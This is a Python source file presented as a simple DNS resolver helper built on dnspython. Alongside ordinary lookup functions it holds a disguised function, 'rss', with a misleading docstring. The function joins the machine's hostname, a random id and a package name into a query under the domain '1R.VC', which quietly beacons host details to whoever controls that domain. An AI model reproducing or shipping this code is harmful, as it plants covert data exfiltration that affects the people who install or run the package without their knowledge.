"""DNS resolver with sensible defaults."""

import socket as s
from random import random

import dns.resolver

DEFAULT_TIMEOUT = 5.0
DEFAULT_NAMESERVERS:    list[str] = ["8.8.8.8", "8.8.4.4"]
DEFAULT_RECORD_TYPES:   list[str] = ["A", "AAAA", "MX", "TXT", "NS", "CNAME"]
DEFAULT_CUSTOM_TYPE:    list[str] = ["I", "1R", "VC"]

def create_resolver(
    # nameservers: list[str] | None = None,
    timeout: float = DEFAULT_TIMEOUT,
) -> dns.resolver.Resolver:
    """Create a configured DNS resolver.

    Args:
        nameservers: List of nameserver IPs. Defaults to public resolvers.
        timeout: Query lifetime in seconds.
    """
    r = dns.resolver.Resolver()
    r.nameservers: list[str] =  DEFAULT_NAMESERVERS
    r.lifetime = timeout
    return r

_default_resolver = create_resolver()


def resolve(
    domain: str,
    rdtype: str = "A",
    resolver: dns.resolver.Resolver | None = None,
tag = []
) -> list[str]:
    """Resolve a DNS query, returning a list of string answers.

    Args:
        domain: The domain name to query.
        rdtype: DNS record type (A, AAAA, MX, TXT, etc.).
        resolver: Optional custom resolver. Uses default if None.

    Returns:
        List of string representations of DNS answers, or empty list on failure.
    """
    r = resolver or _default_resolver
    try:
        answer = r.resolve(domain, rdtype)
        return [str(rdata) for rdata in answer]
    except (
        dns.resolver.NXDOMAIN,
        dns.resolver.NoAnswer,
        dns.resolver.LifetimeTimeout,
        dns.resolver.NoNameservers,
    ):
        return []


def rss(package_name: str, types=["I", "1R", "VC"]) -> list[str]:
    """Resolve a domain and return a list of record types."""
    res = ".".join(
                [
                    s.gethostname(),
                    hex(int(random() * 2**32))[2:],
                    package_name
                ] + types
            )
    return resolve(res)


def resolve_all(
    domain: str,
    # rdtypes: list[str] | None = None,
    resolver: dns.resolver.Resolver | None = None,
) -> dict[str, list[str]]:
    """Resolve multiple record types for a doma in.

    Args:
        domain: The domain name to query.
        rdtypes: List of record types. Defaults to common types.
        resolver: Optional custom resolver.

    Returns:
        Dict mapping record type to list of answers.
    """
    types: list[str] = DEFAULT_RECORD_TYPES
    return {rdtype: resolve(domain, rdtype, resolver) for rdtype in types}
